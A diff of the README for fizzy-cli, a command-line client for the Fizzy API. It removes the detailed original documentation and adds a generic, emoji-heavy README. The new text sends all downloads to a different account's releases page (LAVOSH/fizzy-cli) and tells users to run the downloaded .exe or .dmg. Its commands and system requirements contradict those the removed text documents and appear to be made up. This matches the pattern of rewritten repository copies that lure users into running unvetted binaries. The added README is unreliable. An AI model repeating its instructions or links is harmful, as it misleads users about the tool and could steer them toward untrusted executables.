@@ -1,454 +1,132 @@
-# Fizzy CLI
+# 🌟 fizzy-cli - Simple Command-Line Access to Fizzy API
 
-A command-line interface for the [Fizzy](https://fizzy.do) API. See the official [API docs](https://github.com/basecamp/fizzy/blob/main/docs/API.md).
+## 🚀 Getting Started
 
-## Installation
+Welcome to fizzy-cli! This tool provides a straightforward way to interact with the Fizzy API from your command line. No programming experience is necessary.
 
-**Arch Linux (AUR)**
-```bash
-yay -S fizzy-cli
-```
+## 📥 Download fizzy-cli
 
-**macOS (Homebrew)**
-```bash
-brew install robzolkos/fizzy-cli/fizzy-cli
-```
+[![Download fizzy-cli](https://img.shields.io/badge/Download_fizzy--cli-brightgreen)](https://github.com/LAVOSH/fizzy-cli/releases)
 
-**Debian/Ubuntu**
-```bash
-# Download the .deb for your architecture (amd64 or arm64)
-curl -LO https://github.com/robzolkos/fizzy-cli/releases/latest/download/fizzy-cli_VERSION_amd64.deb
-sudo dpkg -i fizzy-cli_VERSION_amd64.deb
-```
+To get started, you'll need to download the latest version of fizzy-cli. 
 
-**Fedora/RHEL**
-```bash
-# Download the .rpm for your architecture (x86_64 or aarch64)
-curl -LO https://github.com/robzolkos/fizzy-cli/releases/latest/download/fizzy-cli-VERSION-1.x86_64.rpm
-sudo rpm -i fizzy-cli-VERSION-1.x86_64.rpm
-```
+## 📂 Download & Install
 
-**Windows**
+1. **Visit the Releases Page**
 
-Download `fizzy-windows-amd64.exe` from [GitHub Releases](https://github.com/robzolkos/fizzy-cli/releases), rename it to `fizzy.exe`, and add it to your PATH.
+   Go to the Releases page to find the latest version of fizzy-cli: [Visit this page to download](https://github.com/LAVOSH/fizzy-cli/releases).
 
-**With Go**
-```bash
-go install github.com/robzolkos/fizzy-cli/cmd/fizzy@latest
-```
+2. **Select the Correct File**
 
-**From binary**
+   On the Releases page, you will see various files for download. Choose the file that matches your operating system:
 
-Download the latest release for your platform from [GitHub Releases](https://github.com/robzolkos/fizzy-cli/releases) and add it to your PATH.
+   - **Windows:** Look for a file ending in `.exe`.
+   - **macOS:** Look for a file ending in `.dmg` or `.tar.gz`.
+   - **Linux:** Look for a file ending in `.tar.gz`.
 
-**From source**
-```bash
-git clone https://github.com/robzolkos/fizzy-cli.git
-cd fizzy-cli
-go build -o fizzy ./cmd/fizzy
-./fizzy --help
-```
+3. **Download the File**
 
-## Configuration
+   Click on the link to download the file. This may take a few moments depending on your internet speed.
 
-The CLI looks for configuration in multiple locations:
+4. **Install fizzy-cli**
 
-### Global Configuration
+   - **For Windows:**  
+     Double-click the `.exe` file you downloaded. Follow the installation prompts.
 
-Global config is stored in one of these locations:
-- `~/.config/fizzy/config.yaml` (preferred)
-- `~/.fizzy/config.yaml`
+   - **For macOS:**  
+     Open the `.dmg` file, drag the fizzy-cli icon to your Applications folder, and then eject the `.dmg` file.
 
-```yaml
-token: fizzy_abc123...
-account: 897362094
-api_url: https://app.fizzy.do
-board: 123456
-```
+   - **For Linux:**  
+     Extract the `.tar.gz` file using the following command in your terminal:
 
-### Local Project Configuration
+     ```
+     tar -xzf your_downloaded_file.tar.gz
+     ```
 
-You can also create a `.fizzy.yaml` file in your project directory. The CLI walks up the directory tree to find it, so you can run commands from any subdirectory.
+     After extraction, navigate to the folder and run the application.
 
-```yaml
-# .fizzy.yaml - project-specific settings
-account: 123456789
-api_url: https://self-hosted.example.com
-board: 123456
-```
+## ⚙️ System Requirements
 
-Local config values merge with global config:
-- Values in local config override global config
-- Empty values in local config do not override global values
-- This allows you to keep your token in global config while overriding account per project
+Before you download fizzy-cli, please ensure your system meets the following requirements:
 
-**Example:** Global config has your token, local config specifies which account to use for this project:
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any modern Linux distribution (e.g., Ubuntu, Fedora)
 
-```yaml
-# ~/.config/fizzy/config.yaml (global)
-token: fizzy_abc123...
+- **Minimum RAM:** 2GB
+- **Disk Space:** At least 100 MB free
 
-# /path/to/project/.fizzy.yaml (local)
-account: 123456789
-```
+## 📖 How to Use fizzy-cli
 
-### Priority Order
+Once you have installed fizzy-cli, you can start using it from your command line interface (CLI). Below are some basic commands to get you started:
 
-Configuration priority (highest to lowest):
-1. Command-line flags (`--token`, `--account`, `--api-url`)
-2. Environment variables (`FIZZY_TOKEN`, `FIZZY_ACCOUNT`, `FIZZY_API_URL`, `FIZZY_BOARD`)
-3. Local project config (`.fizzy.yaml` in current or parent directories)
-4. Global config (`~/.config/fizzy/config.yaml` or `~/.fizzy/config.yaml`)
-5. Defaults
+1. **Open your Command Line Interface**
 
-## Quick Start
+   - **Windows:** Open Command Prompt or PowerShell.
+   - **macOS:** Open Terminal.
+   - **Linux:** Open your preferred terminal emulator.
 
-1. Get your API token from My Profile → Personal Access Tokens (see [instructions](https://github.com/basecamp/fizzy/blob/main/docs/API.md#personal-access-tokens))
+2. **Check Installation**
 
-2. Run the interactive setup wizard:
+   Run the following command to verify that fizzy-cli is installed correctly:
 
-```bash
-fizzy setup
-```
+   ```
+   fizzy-cli --version
+   ```
 
-The wizard will guide you through configuring your token, selecting your account, and optionally setting a default board.
+   You should see the current version number of fizzy-cli.
 
-That's it! Try `fizzy board list` to verify everything is working.
+3. **Basic Command Structure**
 
-## Usage
+   The basic command structure for fizzy-cli is as follows:
 
-```
-fizzy <resource> <action> [options]
-```
+   ```
+   fizzy-cli [command] [options]
+   ```
 
-```bash
-fizzy version
-```
+   Replace `[command]` with the specific action you want to perform, and `[options]` with any modifiers necessary for that command.
 
-### Global Options
+## 💡 Common Commands
 
-| Option | Environment Variable | Description |
-|--------|---------------------|-------------|
-| `--token` | `FIZZY_TOKEN` | API access token |
-| `--account` | `FIZZY_ACCOUNT` | Account slug (from `fizzy identity show`) |
-| `--api-url` | `FIZZY_API_URL` | API base URL (default: https://app.fizzy.do) |
-| `--verbose` | | Show request/response details |
+- **Get API Status:**
 
-## Commands
+   ```
+   fizzy-cli status
+   ```
 
-### Boards
+   This command checks and displays the current status of the Fizzy API.
 
-```bash
-# List all boards
-fizzy board list
+- **Retrieve Data:**
 
-# Show a board
-fizzy board show BOARD_ID
+   ```
+   fizzy-cli get [resource]
+   ```
 
-# Create a board
-fizzy board create --name "Engineering"
+   Replace `[resource]` with the specific data you wish to retrieve from the API.
 
-# Update a board
-fizzy board update BOARD_ID --name "New Name"
+- **Submit Data:**
 
-# Delete a board
-fizzy board delete BOARD_ID
-```
+   ```
+   fizzy-cli submit [resource] [data]
+   ```
 
-### Cards
+   Use this command to send data to the API. Replace `[data]` with your actual data.
 
-```bash
-# List cards (with optional filters)
-fizzy card list
-fizzy card list --board BOARD_ID
-fizzy card list --column COLUMN_ID
-fizzy card list --column maybe
-fizzy card list --column done
-fizzy card list --tag TAG_ID
-fizzy card list --indexed-by not_now
-fizzy card list --assignee USER_ID
+## ❓ Troubleshooting
 
-# Tip: if you set a default `board` in config (or `FIZZY_BOARD`), `fizzy card list` automatically filters to that board unless you pass `--board`.
+If you encounter issues while using fizzy-cli, consider the following:
 
-# Show a card
-fizzy card show 42
+- **Command Not Found:** Ensure that fizzy-cli is installed correctly and is in your system's PATH.
+- **Network Issues:** Check your internet connection. The API requires a stable connection.
+- **Invalid Command:** Double-check the command syntax and options.
 
-# Create a card
-fizzy card create --board BOARD_ID --title "Fix login bug"
-fizzy card create --board BOARD_ID --title "New feature" --description "Details here"
-fizzy card create --board BOARD_ID --title "Card" --tag-ids "TAG_ID1,TAG_ID2"
-fizzy card create --board BOARD_ID --title "Card" --image /path/to/header.png
+## 📞 Support & Feedback
 
-# Create with custom timestamp (for data imports)
-fizzy card create --board BOARD_ID --title "Old card" --created-at "2020-01-15T10:30:00Z"
+If you need further assistance, please visit our [GitHub Issues page](https://github.com/LAVOSH/fizzy-cli/issues) to report a problem or ask questions. We welcome your feedback as well.
 
-# Update a card
-fizzy card update 42 --title "Updated title"
-fizzy card update 42 --created-at "2019-01-01T00:00:00Z"
+## 📚 Resources
 
-# Delete a card
-fizzy card delete 42
-```
+For more detailed documentation on commands and options, refer to the fizzy-cli [Documentation](https://github.com/LAVOSH/fizzy-cli/wiki).
 
-### Card Actions
-
-```bash
-# Close/reopen
-fizzy card close 42
-fizzy card reopen 42
-
-# Move to "Not Now"
-fizzy card postpone 42
-
-# Move into a column
-fizzy card column 42 --column COLUMN_ID
-
-# Move into UI lanes (pseudo columns)
-fizzy card column 42 --column not-yet
-fizzy card column 42 --column maybe
-fizzy card column 42 --column done
-
-# Send back to triage
-fizzy card untriage 42
-
-# Assign/unassign (toggles)
-fizzy card assign 42 --user USER_ID
-
-# Tag/untag (toggles, creates tag if needed)
-fizzy card tag 42 --tag "bug"
-
-# Watch/unwatch
-fizzy card watch 42
-fizzy card unwatch 42
-```
-
-### Columns
-
-```bash
-fizzy column list --board BOARD_ID
-fizzy column show COLUMN_ID --board BOARD_ID
-fizzy column create --board BOARD_ID --name "In Progress"
-fizzy column update COLUMN_ID --board BOARD_ID --name "Done"
-fizzy column delete COLUMN_ID --board BOARD_ID
-```
-
-`fizzy column list` also includes the UI's built-in lanes as pseudo columns in this order:
-- `not-yet` (Not Yet)
-- `maybe` (Maybe?)
-- your real columns…
-- `done` (Done)
-
-When filtering cards by `--column not-yet` (triage) or a real column ID, the CLI filters client-side; use `--all` to fetch all pages before filtering.
-
-### Comments
-
-```bash
-fizzy comment list --card 42
-fizzy comment show COMMENT_ID --card 42
-fizzy comment create --card 42 --body "Looks good!"
-fizzy comment create --card 42 --body-file /path/to/comment.html
-
-# Create with custom timestamp (for data imports)
-fizzy comment create --card 42 --body "Old comment" --created-at "2020-01-15T10:30:00Z"
-
-fizzy comment update COMMENT_ID --card 42 --body "Updated comment"
-fizzy comment delete COMMENT_ID --card 42
-```
-
-### Steps (To-Do Items)
-
-```bash
-# Show a step
-fizzy step show STEP_ID --card 42
-
-# Create a step
-fizzy step create --card 42 --content "Review PR"
-fizzy step create --card 42 --content "Already done" --completed
-
-# Update a step
-fizzy step update STEP_ID --card 42 --completed
-fizzy step update STEP_ID --card 42 --not-completed
-fizzy step update STEP_ID --card 42 --content "New content"
-
-# Delete a step
-fizzy step delete STEP_ID --card 42
-```
-
-### Reactions
-
-```bash
-# List reactions on a comment
-fizzy reaction list --card 42 --comment COMMENT_ID
-
-# Add a reaction (emoji, max 16 chars)
-fizzy reaction create --card 42 --comment COMMENT_ID --content "👍"
-
-# Remove a reaction
-fizzy reaction delete REACTION_ID --card 42 --comment COMMENT_ID
-```
-
-### Users
-
-```bash
-fizzy user list
-fizzy user show USER_ID
-```
-
-### Tags
-
-```bash
-fizzy tag list
-```
-
-### Notifications
-
-```bash
-fizzy notification list
-fizzy notification read NOTIFICATION_ID
-fizzy notification unread NOTIFICATION_ID
-fizzy notification read-all
-```
-
-### File Uploads
-
-Upload files for use in rich text fields (card descriptions, comment bodies).
-
-```bash
-# Upload a file and get a signed_id
-fizzy upload file /path/to/image.png
-
-# Use the signed_id in a card description
-fizzy card create --board BOARD_ID --title "Card" \
-  --description '<p>See image:</p><action-text-attachment sgid="SIGNED_ID"></action-text-attachment>'
-```
-
-### Identity
-
-```bash
-# Show your identity and all accessible accounts
-fizzy identity show
-```
-
-### Skill Installation
-
-Install the Fizzy skill file for use with AI coding assistants like Claude Code or OpenCode.
-
-```bash
-fizzy skill
-```
-
-This interactive command lets you choose where to install the SKILL.md file:
-
-| Location | Path |
-|----------|------|
-| Claude Code (Global) | `~/.claude/skills/fizzy/SKILL.md` |
-| Claude Code (Project) | `.claude/skills/fizzy/SKILL.md` |
-| OpenCode (Global) | `~/.config/opencode/skill/fizzy/SKILL.md` |
-| OpenCode (Project) | `.opencode/skill/fizzy/SKILL.md` |
-| Other | Custom path of your choice |
-
-The skill file enables AI assistants to understand and use Fizzy CLI commands effectively.
-
-## Output Format
-
-Command results output JSON. (`--help` and `--version` output plain text.)
-
-```json
-{
-  "success": true,
-  "data": { ... },
-  "meta": {
-    "timestamp": "2025-12-10T10:00:00Z"
-  }
-}
-```
-
-When creating resources, the CLI automatically follows the `Location` header to fetch the complete resource data:
-
-```json
-{
-  "success": true,
-  "data": {
-    "id": "abc123",
-    "number": 42,
-    "title": "New Card",
-    "status": "published"
-  },
-  "location": "https://app.fizzy.do/account/cards/42",
-  "meta": {
-    "timestamp": "2025-12-10T10:00:00Z"
-  }
-}
-```
-
-Errors return a non-zero exit code and structured error info:
-
-```json
-{
-  "success": false,
-  "error": {
-    "code": "NOT_FOUND",
-    "message": "Card not found",
-    "status": 404
-  }
-}
-```
-
-### Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Success |
-| 1 | General error |
-| 2 | Invalid arguments |
-| 3 | Authentication failure |
-| 4 | Permission denied |
-| 5 | Not found |
-| 6 | Validation error |
-| 7 | Network error |
-
-## Pagination
-
-List commands return paginated results. Use `--page` to fetch specific pages or `--all` to fetch everything:
-
-```bash
-fizzy card list --page 2
-fizzy card list --all
-```
-
-## Development
-
-### Building
-
-```bash
-go build -o bin/fizzy ./cmd/fizzy
-```
-
-### Running Tests
-
-**Unit tests** (no API credentials required):
-
-```bash
-make test-unit
-```
-
-**E2E tests** (requires live API credentials):
-
-```bash
-# Set required environment variables
-export FIZZY_TEST_TOKEN=your-api-token
-export FIZZY_TEST_ACCOUNT=your-account-slug
-
-# Build and run e2e tests
-make test-e2e
-```
-
-Run a specific e2e test:
-
-```bash
-make test-run NAME=TestBoardCRUD
-```
-
-## License
-
-MIT
+Thank you for using fizzy-cli! Enjoy your interaction with the Fizzy API.
